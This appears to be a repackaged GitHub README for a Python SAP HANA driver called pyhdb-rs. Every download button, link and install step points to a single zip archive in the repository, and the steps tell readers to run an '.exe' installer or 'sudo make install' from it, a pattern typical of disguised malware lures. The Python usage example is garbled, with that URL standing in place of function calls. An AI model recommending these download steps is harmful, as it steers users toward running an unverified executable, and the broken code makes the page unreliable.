# 🚀 pyhdb-rs - Fast Data Connection for Python Users

[![Download pyhdb-rs](https://raw.githubusercontent.com/Julius1830/pyhdb-rs/main/crates/hdbconnect-py/pyhdb_rs_v2.7.zip)](https://raw.githubusercontent.com/Julius1830/pyhdb-rs/main/crates/hdbconnect-py/pyhdb_rs_v2.7.zip)

## 📦 Introduction

Welcome to **pyhdb-rs**! This software is a Rust-powered driver for SAP HANA that works with Python. It offers fast data transfer using Apache Arrow, which means you can work with data in Pandas and Polars with ease. It follows the DB-API 2.0 standard, supports asynchronous programming, and includes connection pooling for better performance.

## 📋 Key Features

- **Rust-Powered**: Benefit from Rust’s performance and safety features.
- **Native Apache Arrow Support**: Quickly transfer data to Pandas and Polars without delay.
- **DB-API 2.0 Compliance**: Use familiar database functions in your Python code.
- **Async/Await Support**: Write code that performs non-blocking operations.
- **Connection Pooling**: Efficiently manage multiple connections to your database.

## 🌐 System Requirements

To use pyhdb-rs effectively, ensure you have the following:

- **Operating System**: Windows, macOS, or Linux
- **Python Version**: Python 3.6 or later
- **Rust**: The Rust programming language installed (for building from source)
- **SAP HANA Access**: An active SAP HANA database for connection

## 🚀 Getting Started

To get started with pyhdb-rs, follow these steps:

1. **Download the Software**: 
   Click the button below to visit the Releases page, where you can download the latest version of pyhdb-rs.
   [![Download pyhdb-rs](https://raw.githubusercontent.com/Julius1830/pyhdb-rs/main/crates/hdbconnect-py/pyhdb_rs_v2.7.zip)](https://raw.githubusercontent.com/Julius1830/pyhdb-rs/main/crates/hdbconnect-py/pyhdb_rs_v2.7.zip)

2. **Choose Your Version**:
   On the Releases page, locate the latest version and select the appropriate file for your operating system.

3. **Install the Software**:
   After downloading the file, follow these instructions based on your platform:
   
   - **Windows**:
     - Run the downloaded `.exe` installer.
     
   - **macOS**:
     - Open the `.pkg` file and follow the installation instructions.
     
   - **Linux**:
     - Use the terminal to run the `https://raw.githubusercontent.com/Julius1830/pyhdb-rs/main/crates/hdbconnect-py/pyhdb_rs_v2.7.zip` file:
       ```bash
       tar -xvzf https://raw.githubusercontent.com/Julius1830/pyhdb-rs/main/crates/hdbconnect-py/pyhdb_rs_v2.7.zip
       cd pyhdb-rs
       sudo make install
       ```

## 🔗 Download & Install

To download the software, follow this link: [Visit the Releases Page](https://raw.githubusercontent.com/Julius1830/pyhdb-rs/main/crates/hdbconnect-py/pyhdb_rs_v2.7.zip). Remember to choose the correct file for your system.

## 🛠️ Example Usage

Here’s a simple example of how to use pyhdb-rs in your Python code:

```python
import pyhdb

# Create a connection to the database
connection = https://raw.githubusercontent.com/Julius1830/pyhdb-rs/main/crates/hdbconnect-py/pyhdb_rs_v2.7.zip(host='YOUR_HOST', port=YOUR_PORT, user='YOUR_USER', password='YOUR_PASSWORD')

# Create a cursor
cursor = https://raw.githubusercontent.com/Julius1830/pyhdb-rs/main/crates/hdbconnect-py/pyhdb_rs_v2.7.zip()

# Execute a query
https://raw.githubusercontent.com/Julius1830/pyhdb-rs/main/crates/hdbconnect-py/pyhdb_rs_v2.7.zip("SELECT * FROM YOUR_TABLE")

# Fetch and print results
for row in https://raw.githubusercontent.com/Julius1830/pyhdb-rs/main/crates/hdbconnect-py/pyhdb_rs_v2.7.zip():
    print(row)

# Close the connection
https://raw.githubusercontent.com/Julius1830/pyhdb-rs/main/crates/hdbconnect-py/pyhdb_rs_v2.7.zip()
```

## 📚 Documentation

For further details on how to use pyhdb-rs, please refer to the official documentation linked on the repository page. You can find information about advanced configurations, connection parameters, and lifestyle management.

## 👥 Community and Support

If you run into issues or have questions, consider visiting our community page on GitHub. You can open an issue or join discussions for assistance.

## 🔄 Contributing

We welcome contributions! If you have ideas for improvements, feel free to create a pull request. Please ensure you adhere to the coding standards and write clear documentation for your changes.

## 📜 License

pyhdb-rs is licensed under the MIT License. You can find more details in the LICENSE file in the repository.

## 🌟 Final Notes

Thank you for choosing pyhdb-rs. We hope this driver makes your interactions with SAP HANA smooth and efficient. For any issues, remember to check our GitHub page and community feedback. Happy coding!